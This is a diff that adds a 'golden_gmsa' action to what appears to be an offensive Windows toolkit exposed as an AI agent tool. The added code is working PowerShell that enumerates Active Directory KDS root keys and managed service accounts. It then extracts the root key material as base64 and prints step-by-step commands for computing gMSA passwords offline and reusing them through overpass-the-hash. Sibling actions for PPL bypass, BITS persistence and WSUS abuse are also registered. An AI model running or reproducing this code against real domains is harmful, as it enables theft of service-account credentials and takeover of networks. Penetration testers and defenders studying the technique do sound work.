@@ -21285,6 +21285,253 @@ try {
   return { output: output.join("\n"), findings }
 }
 
+async function goldenGmsa(args: string[], timeout: number): Promise<HookResult> {
+  const action = argVal(args, "--action") || "enum"
+  const sid = argVal(args, "--sid")
+  const kdsKeyId = argVal(args, "--kds-key-id")
+  const findings: Finding[] = []
+  const output: string[] = ["[*] GoldenGMSA attack operations...\n"]
+
+  if (action === "enum") {
+    const script = `
+Write-Output "=== KDS Root Key Enumeration ==="
+Write-Output ""
+
+# Enumerate KDS root keys from AD
+$configDN = ([ADSI]"LDAP://RootDSE").configurationNamingContext
+$kdsContainer = "CN=Master Root Keys,CN=Group Key Distribution Service,CN=Services,$configDN"
+Write-Output "KDS Container: $kdsContainer"
+Write-Output ""
+
+try {
+  $searcher = New-Object System.DirectoryServices.DirectorySearcher
+  $searcher.SearchRoot = [ADSI]"LDAP://$kdsContainer"
+  $searcher.Filter = "(objectClass=msKds-ProvRootKey)"
+  $searcher.PropertiesToLoad.AddRange(@('cn', 'msKds-CreateTime', 'msKds-UseStartTime', 'msKds-DomainID', 'msKds-Version', 'msKds-KDFAlgorithmID', 'msKds-SecretAgreementAlgorithmID', 'msKds-RootKeyData', 'msKds-KDFParam', 'msKds-SecretAgreementParam', 'msKds-PrivateKeyLength', 'msKds-PublicKeyLength', 'whenCreated'))
+  $results = $searcher.FindAll()
+
+  Write-Output "KDS Root Keys Found: $($results.Count)"
+  Write-Output "KDS_COUNT=$($results.Count)"
+  Write-Output ""
+
+  foreach ($r in $results) {
+    $props = $r.Properties
+    $keyId = $props['cn'][0]
+    Write-Output "--- KDS Root Key: $keyId ---"
+    Write-Output "  GUID: $keyId"
+
+    if ($props['mskds-createtime']) {
+      $createTime = [DateTime]::FromFileTimeUtc([Int64]::Parse($props['mskds-createtime'][0].ToString()))
+      Write-Output "  Created: $createTime"
+    }
+    if ($props['mskds-usestarttime']) {
+      $useStart = [DateTime]::FromFileTimeUtc([Int64]::Parse($props['mskds-usestarttime'][0].ToString()))
+      Write-Output "  Effective: $useStart"
+      $isActive = $useStart -le (Get-Date).ToUniversalTime()
+      Write-Output "  Active: $(if ($isActive) { 'YES' } else { 'NOT YET (future effective date)' })"
+    }
+    if ($props['mskds-version']) { Write-Output "  Version: $($props['mskds-version'][0])" }
+    if ($props['mskds-kdfalgorithmid']) { Write-Output "  KDF Algorithm: $($props['mskds-kdfalgorithmid'][0])" }
+    if ($props['mskds-secretagreementalgorithmid']) { Write-Output "  Secret Agreement: $($props['mskds-secretagreementalgorithmid'][0])" }
+    if ($props['mskds-privatekeylength']) { Write-Output "  Private Key Length: $($props['mskds-privatekeylength'][0])" }
+    if ($props['mskds-publickkeylength']) { Write-Output "  Public Key Length: $($props['mskds-publickeylength'][0])" }
+
+    # Check if root key data is readable
+    $hasKeyData = $props['mskds-rootkeydata'] -ne $null
+    Write-Output "  Root Key Data Readable: $(if ($hasKeyData) { 'YES [!]' } else { 'NO (insufficient privileges)' })"
+    if ($hasKeyData) { Write-Output "  HAS_KEY_DATA=1" }
+    Write-Output ""
+  }
+} catch {
+  Write-Output "[-] Error enumerating KDS keys: $_"
+  Write-Output "    Requires domain user privileges minimum"
+}
+
+# Enumerate gMSA accounts
+Write-Output "=== Group Managed Service Accounts ==="
+try {
+  $gmsaSearcher = New-Object System.DirectoryServices.DirectorySearcher
+  $gmsaSearcher.Filter = "(objectClass=msDS-GroupManagedServiceAccount)"
+  $gmsaSearcher.PropertiesToLoad.AddRange(@('sAMAccountName', 'msDS-ManagedPasswordId', 'msDS-ManagedPasswordInterval', 'msDS-GroupMSAMembership', 'servicePrincipalName', 'objectSid', 'userAccountControl', 'description'))
+  $gmsas = $gmsaSearcher.FindAll()
+
+  Write-Output "gMSA Accounts Found: $($gmsas.Count)"
+  Write-Output "GMSA_COUNT=$($gmsas.Count)"
+  Write-Output ""
+
+  foreach ($g in $gmsas) {
+    $p = $g.Properties
+    $name = $p['samaccountname'][0]
+    Write-Output "--- gMSA: $name ---"
+
+    if ($p['objectsid']) {
+      $sidBytes = [byte[]]$p['objectsid'][0]
+      $sidObj = New-Object System.Security.Principal.SecurityIdentifier($sidBytes, 0)
+      Write-Output "  SID: $sidObj"
+    }
+    if ($p['msds-managedpasswordinterval']) { Write-Output "  Password Interval: $($p['msds-managedpasswordinterval'][0]) days" }
+    if ($p['serviceprincipalname']) {
+      Write-Output "  SPNs:"
+      foreach ($spn in $p['serviceprincipalname']) { Write-Output "    $spn" }
+    }
+    if ($p['description']) { Write-Output "  Description: $($p['description'][0])" }
+
+    # Parse ManagedPasswordId to find which KDS root key is used
+    if ($p['msds-managedpasswordid']) {
+      $pwdId = [byte[]]$p['msds-managedpasswordid'][0]
+      if ($pwdId.Length -ge 24) {
+        # Extract root key GUID from ManagedPasswordId (offset 24, 16 bytes)
+        $guidBytes = $pwdId[24..39]
+        $rootKeyGuid = [Guid]::new($guidBytes)
+        Write-Output "  KDS Root Key GUID: $rootKeyGuid"
+        Write-Output "  ROOT_KEY=$rootKeyGuid"
+      }
+    }
+    Write-Output ""
+  }
+} catch {
+  Write-Output "[-] Error enumerating gMSAs: $_"
+}
+`
+    const r = await ps(script, timeout)
+    output.push(r.stdout)
+
+    const kdsCount = r.stdout.match(/KDS_COUNT=(\d+)/)
+    const gmsaCount = r.stdout.match(/GMSA_COUNT=(\d+)/)
+    const hasKeyData = r.stdout.includes("HAS_KEY_DATA=1")
+
+    if (hasKeyData) {
+      findings.push({
+        checkId: "WIN-GMSA-001",
+        provider: "windows",
+        severity: "critical",
+        status: "EXTRACTABLE",
+        resource: "ad://kds-root-key",
+        title: "KDS root key data readable — GoldenGMSA attack possible",
+        details: `KDS root key material is accessible. With this key, gMSA passwords can be computed OFFLINE for any managed service account without DC connectivity. Use --action extract to dump key material.`,
+        remediation: "Restrict read access to KDS root keys. Only Domain Controllers should have access to msKds-RootKeyData.",
+      })
+    }
+
+    if (gmsaCount && parseInt(gmsaCount[1]) > 0) {
+      findings.push({
+        checkId: "WIN-GMSA-002",
+        provider: "windows",
+        severity: "medium",
+        status: "INFO",
+        resource: "ad://gmsa",
+        title: `${gmsaCount[1]} gMSA accounts found — potential GoldenGMSA targets`,
+        details: "Group Managed Service Accounts use KDS-derived passwords. If KDS root key is extracted, all gMSA passwords can be computed offline.",
+        remediation: "Monitor KDS root key access, rotate keys periodically.",
+      })
+    }
+  }
+
+  if (action === "extract") {
+    const script = `
+Write-Output "=== KDS Root Key Extraction ==="
+Write-Output ""
+
+$configDN = ([ADSI]"LDAP://RootDSE").configurationNamingContext
+$kdsContainer = "CN=Master Root Keys,CN=Group Key Distribution Service,CN=Services,$configDN"
+
+$searcher = New-Object System.DirectoryServices.DirectorySearcher
+$searcher.SearchRoot = [ADSI]"LDAP://$kdsContainer"
+${kdsKeyId ? `$searcher.Filter = "(&(objectClass=msKds-ProvRootKey)(cn=${kdsKeyId}))"` : '$searcher.Filter = "(objectClass=msKds-ProvRootKey)"'}
+$searcher.PropertiesToLoad.AddRange(@('cn', 'msKds-RootKeyData', 'msKds-KDFAlgorithmID', 'msKds-KDFParam', 'msKds-SecretAgreementAlgorithmID', 'msKds-SecretAgreementParam', 'msKds-PrivateKeyLength', 'msKds-PublicKeyLength', 'msKds-CreateTime', 'msKds-UseStartTime', 'msKds-Version'))
+$results = $searcher.FindAll()
+
+foreach ($r in $results) {
+  $props = $r.Properties
+  $keyId = $props['cn'][0]
+  Write-Output "--- Extracting KDS Root Key: $keyId ---"
+
+  $rootKeyData = $props['mskds-rootkeydata']
+  if ($rootKeyData) {
+    $keyBytes = [byte[]]$rootKeyData[0]
+    $keyB64 = [Convert]::ToBase64String($keyBytes)
+    Write-Output "  Key Length: $($keyBytes.Length) bytes"
+    Write-Output "  Key (Base64): $keyB64"
+    Write-Output "  KEY_DATA=$keyB64"
+    Write-Output ""
+
+    # Extract KDF parameters
+    if ($props['mskds-kdfparam']) {
+      $kdfParam = [byte[]]$props['mskds-kdfparam'][0]
+      Write-Output "  KDF Param (Base64): $([Convert]::ToBase64String($kdfParam))"
+    }
+    if ($props['mskds-secretagreementparam']) {
+      $saParam = [byte[]]$props['mskds-secretagreementparam'][0]
+      Write-Output "  Secret Agreement Param (Base64): $([Convert]::ToBase64String($saParam))"
+    }
+
+    Write-Output ""
+    Write-Output "[+] Root key extracted successfully"
+    Write-Output "[*] Use GoldenGMSA tool to compute gMSA passwords:"
+    Write-Output "    GoldenGMSA.exe compute --sid GMSA_SID --kdskey $keyB64"
+    Write-Output ""
+    Write-Output "[*] Or use Python gMSADumper with extracted key material"
+    Write-Output "EXTRACT_STATUS=SUCCESS"
+  } else {
+    Write-Output "  [-] Cannot read msKds-RootKeyData — insufficient privileges"
+    Write-Output "  [*] Required: Domain Admin or equivalent (read access to CN=Master Root Keys)"
+    Write-Output "  [*] Alternative: Use gmsa_dump to read msDS-ManagedPassword directly"
+    Write-Output "EXTRACT_STATUS=NO_ACCESS"
+  }
+  Write-Output ""
+}
+
+if ($results.Count -eq 0) {
+  Write-Output "[-] No KDS root keys found${kdsKeyId ? ` matching ${kdsKeyId}` : ""}"
+  Write-Output "EXTRACT_STATUS=NOT_FOUND"
+}
+`
+    const r = await ps(script, timeout)
+    output.push(r.stdout)
+
+    if (r.stdout.includes("EXTRACT_STATUS=SUCCESS")) {
+      findings.push({
+        checkId: "WIN-GMSA-010",
+        provider: "windows",
+        severity: "critical",
+        status: "EXTRACTED",
+        resource: "ad://kds-root-key",
+        title: "KDS root key material extracted — offline gMSA password computation possible",
+        details: "Root key data has been extracted. Use GoldenGMSA.exe or gMSADumper to compute passwords for any gMSA account without DC connectivity.",
+        remediation: "Rotate KDS root keys, revoke compromised gMSA accounts, audit key access.",
+      })
+    }
+  }
+
+  if (action === "compute") {
+    if (!sid) {
+      output.push("ERROR: --sid required for compute action (gMSA account SID)")
+      return { output: output.join("\n"), findings }
+    }
+    output.push("=== gMSA Password Computation ===")
+    output.push("")
+    output.push("[!] Password computation requires the GoldenGMSA tool or Python implementation")
+    output.push("[*] The KDS key derivation uses SP800-108 CTR-HMAC with domain-specific context")
+    output.push("")
+    output.push("Step 1: Extract KDS root key (if not done)")
+    output.push("  winhook golden_gmsa --action extract")
+    output.push("")
+    output.push("Step 2: Compute gMSA password")
+    output.push(`  GoldenGMSA.exe compute --sid ${sid}${kdsKeyId ? ` --kdskey <base64_key>` : ""}`)
+    output.push("")
+    output.push("Step 3: Use the password")
+    output.push(`  # Pass-the-hash with computed NTLM:`)
+    output.push(`  winhook overpass_hash --user gMSA_NAME$ --hash <computed_hash>`)
+    output.push("")
+    output.push("Alternative Python approach:")
+    output.push("  python3 gMSADumper.py -d DOMAIN -u USER -p PASS")
+    output.push("  # Or with extracted root key:")
+    output.push("  python3 GoldenGMSA.py --kds-key <base64> --sid " + sid)
+  }
+
+  return { output: output.join("\n"), findings }
+}
+
 // ── Dispatch ──
 
 async function privilegeAbuse(args: string[], timeout: number): Promise<HookResult> {
@@ -24917,6 +25164,7 @@ const dispatch: Record<Program, (args: string[], timeout: number) => Promise<Hoo
   ppl_bypass: pplBypass,
   bits_persist: bitsPersist,
   wsus_abuse: wsusAbuse,
+  golden_gmsa: goldenGmsa,
 }
 
 export const WinhookTool = Tool.define("winhook", {
